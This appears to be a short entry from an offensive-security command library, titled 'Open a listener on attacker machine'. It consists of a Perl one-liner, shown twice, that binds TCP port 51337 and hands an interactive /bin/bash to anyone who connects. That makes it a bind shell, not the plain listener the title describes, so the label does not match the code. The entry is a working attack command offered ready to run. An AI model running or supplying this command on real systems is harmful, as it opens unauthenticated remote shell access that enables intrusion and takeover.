---
id: 1a9d38de-d65b-4549-b8cc-3727496dbb53
name: Open a listener on attacker machine
type: command
executor: bash
data: 'perl -e ''use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\

  bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\

  close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash
  -i");};'''
output: null
created_at: '2023-04-06T03:56:08.747540+00:00'
updated_at: '2023-04-10T20:21:16.647403+00:00'
---

# Open a listener on attacker machine

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```


